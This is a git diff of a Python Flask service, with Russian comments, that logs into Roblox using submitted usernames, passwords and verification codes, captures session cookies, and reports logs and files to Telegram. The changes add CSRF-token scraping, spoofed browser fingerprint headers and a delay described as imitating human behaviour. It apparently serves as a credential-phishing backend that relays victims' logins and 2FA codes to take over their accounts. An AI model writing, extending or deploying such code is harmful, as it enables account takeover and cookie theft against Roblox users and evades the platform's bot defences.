@@ -5,6 +5,7 @@ import os
 import requests
 import uuid
 import re
+import time
 from urllib.parse import urlparse, parse_qs
 from dotenv import load_dotenv
 
@@ -49,20 +50,41 @@ def send_telegram_file(filepath, caption=None):
 def get_roblox_csrf_token(session):
     """Получает CSRF токен от Roblox"""
     try:
+        # Сначала получаем главную страницу для установки куки
+        main_response = session.get('https://www.roblox.com/')
+        if main_response.status_code != 200:
+            send_telegram_log(f"[ERROR] Не удалось загрузить главную страницу Roblox: {main_response.status_code}")
+            return None
+        
+        # Теперь получаем страницу логина
         response = session.get('https://www.roblox.com/login')
         if response.status_code == 200:
             # Ищем CSRF токен в HTML
             csrf_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
             if csrf_match:
+                send_telegram_log(f"[INFO] CSRF токен найден через meta tag")
                 return csrf_match.group(1)
             
             # Альтернативный способ поиска токена
             csrf_match = re.search(r'"csrfToken":"([^"]+)"', response.text)
             if csrf_match:
+                send_telegram_log(f"[INFO] CSRF токен найден через JSON")
                 return csrf_match.group(1)
+            
+            # Еще один способ - ищем в скриптах
+            csrf_match = re.search(r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']', response.text)
+            if csrf_match:
+                send_telegram_log(f"[INFO] CSRF токен найден в скриптах")
+                return csrf_match.group(1)
+            
+            send_telegram_log(f"[WARNING] CSRF токен не найден в HTML")
+            return None
+        else:
+            send_telegram_log(f"[ERROR] Не удалось загрузить страницу логина: {response.status_code}")
+            return None
     except Exception as e:
-        print(f"Ошибка получения CSRF токена: {e}")
-    return None
+        send_telegram_log(f"[ERROR] Ошибка получения CSRF токена: {e}")
+        return None
 
 def roblox_login_and_get_cookies(username, password, session_id=None, code=None):
     """Выполняет вход в Roblox и получает куки"""
@@ -75,17 +97,20 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
         # Устанавливаем заголовки как у реального браузера
         session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Language': 'ru-RU,ru;q=0.9,en;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9,ru;q=0.8',
             'Accept-Encoding': 'gzip, deflate, br',
             'DNT': '1',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-Site': 'same-origin',
             'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0'
+            'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"'
         })
         
         if code is not None:
@@ -160,10 +185,14 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
             # ПЕРВЫЙ ЭТАП: Ввод логина и пароля
             
             # Получаем CSRF токен
+            send_telegram_log(f"[INFO] Получаю CSRF токен для {username}")
             csrf_token = get_roblox_csrf_token(session)
             if not csrf_token:
                 send_telegram_log(f"[ERROR] Не удалось получить CSRF токен для {username}")
                 return {'success': False, 'message': 'Не удалось получить токен безопасности'}
+            
+            # Небольшая задержка для имитации человеческого поведения
+            time.sleep(1)
             
             # Отправляем данные для входа
             login_data = {
@@ -330,6 +359,36 @@ def submit_code():
 def health_check():
     """Эндпоинт для проверки здоровья сервиса на Render"""
     return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})
+
+@app.route('/test-roblox')
+def test_roblox():
+    """Тестовый эндпоинт для проверки подключения к Roblox"""
+    try:
+        session = requests.Session()
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        })
+        
+        # Тестируем подключение к Roblox
+        response = session.get('https://www.roblox.com/')
+        if response.status_code == 200:
+            return jsonify({
+                'status': 'success',
+                'message': 'Подключение к Roblox успешно',
+                'status_code': response.status_code,
+                'content_length': len(response.text)
+            })
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': f'Ошибка подключения к Roblox: {response.status_code}',
+                'status_code': response.status_code
+            })
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'message': f'Ошибка: {str(e)}'
+        })
 
 if __name__ == '__main__':
     # Для локальной разработки
